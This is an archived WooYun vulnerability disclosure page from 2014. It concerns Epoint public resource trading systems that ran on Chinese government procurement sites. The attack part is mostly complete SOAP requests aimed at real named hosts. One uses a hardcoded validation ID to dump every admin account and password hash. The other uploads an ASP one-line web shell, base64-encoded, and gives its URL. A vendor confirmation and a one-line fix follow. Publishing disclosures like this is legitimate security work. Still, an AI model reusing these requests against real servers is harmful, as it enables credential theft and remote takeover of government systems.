@@ -1,0 +1,205 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		某公共资源交易管理系统漏洞之二  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		某公共资源交易管理系统漏洞之二  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/鶆鶈">鶆鶈</a> 
+</li><li>提交时间：		2014-01-07 10:38</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-07：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-15：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-01：	细节向普通白帽子公开<br/>
+									2014-02-21：	细节向实习白帽子公开<br/>
+									2014-04-07：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">某公共资源交易管理系统（Epoint，开发厂家是江苏国泰新点软件有限公司）存在安全漏洞，可导致管理用户帐号密码泄露、GetShell等。关于这套系统的更多描述参考：http://www.wooyun.org/bugs/wooyun-2013-047515/trace/112728009f90998e18ea58e6e43ca8a8</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">该系统的存在危险的webservice操作，通过相关UserManageService的GetAllUser操作可以获得所有管理用户的帐号和密码HASH，通过AjaxUpload的UploadData操作可直接向服务器写脚本文件GetShell。<br />
+<br />
+1：用户帐号密码泄露<br />
+<br />
+以江西公共资源交易系统为例，该WebService详细信息见：http://ncztb.jiangxi.gov.cn/ncztb/webservice/UserManageService.asmx</p><pre><code>POST /ncztb/webservice/UserManageService.asmx HTTP/1.1<br />
+Host: ncztb.jiangxi.gov.cn<br />
+Content-Type: text/xml; charset=utf-8<br />
+Content-Length: length<br />
+SOAPAction: &quot;http://tempuri.org/GetAllUser&quot;<br />
+<br />
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br />
+&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;<br />
+  &lt;soap:Body&gt;<br />
+    &lt;GetAllUser xmlns=&quot;http://tempuri.org/&quot;&gt;<br />
+      &lt;ValidateID&gt;EpointFrame&lt;/ValidateID&gt;<br />
+    &lt;/GetAllUser&gt;<br />
+  &lt;/soap:Body&gt;<br />
+&lt;/soap:Envelope&gt;</code></pre><p class='detail'>这里需要一个ValidateID，这个值是EpointFrame，获取后的密码HASH可以上cmd5上解密。<br />
+<br />
+<br />
+<br />
+2：任意文件写入漏洞<br />
+<br />
+以湖北公共资源交易信息网为例，该WebService详细信息见：http://www.hbggzy.cn/hubeiyewu/webservice/AjaxUpload.asmx</p><pre><code>POST /hubeiyewu/webservice/AjaxUpload.asmx HTTP/1.1<br />
+Host: www.hbggzy.cn<br />
+Content-Type: text/xml; charset=utf-8<br />
+Content-Length: 434<br />
+SOAPAction: &quot;http://tempuri.org/UploadData&quot;<br />
+<br />
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br />
+&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;<br />
+  &lt;soap:Body&gt;<br />
+    &lt;UploadData xmlns=&quot;http://tempuri.org/&quot;&gt;<br />
+      &lt;fileName&gt;evil.asp&lt;/fileName&gt;<br />
+      &lt;fileSize&gt;30&lt;/fileSize&gt;<br />
+      &lt;file&gt;PCVldmFsKHJlcXVlc3QoImMiKSklPg==&lt;/file&gt;<br />
+    &lt;/UploadData&gt;<br />
+  &lt;/soap:Body&gt;<br />
+&lt;/soap:Envelope&gt;</code></pre><p class='detail'>CVldmFsKHJlcXVlc3QoImMiKSklPg==是一句话&lt;%eval(request(“c”))%&gt;经base64编码后的内容，文件写入后服务器并不会返回文件路径，本例中的shell路径是：http://www.hbggzy.cn/hubeiyewu/evil.asp </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">获取用户名密码：</p><p class="detail"><a href="../images/31204702d70f46804e40ebf85db4ce64143af6bc.png" target="_blank"><img src="../images/31204702d70f46804e40ebf85db4ce64143af6bc.png" alt="1.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/31204715d35456a5c61b66746e825824e73e9148.png" target="_blank"><img src="../images/31204715d35456a5c61b66746e825824e73e9148.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+GetShell</p><p class="detail"><a href="../images/312047246b692b7de6d8ca32aefc066eaf111bc8.png" target="_blank"><img src="../images/312047246b692b7de6d8ca32aefc066eaf111bc8.png" alt="3.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">删除WebService，简单粗暴。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/鶆鶈" title="鶆鶈">鶆鶈</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-047565" title="某公共资源交易管理系统漏洞之二">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：18 </p>
+													<p class="detail">确认时间：2014-01-12 09:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述多个情况，已经转由CNCERT分别将案例下发给江西和湖北分中心，并建议由网站管理单位联系软件生产厂商处置。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="47565";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
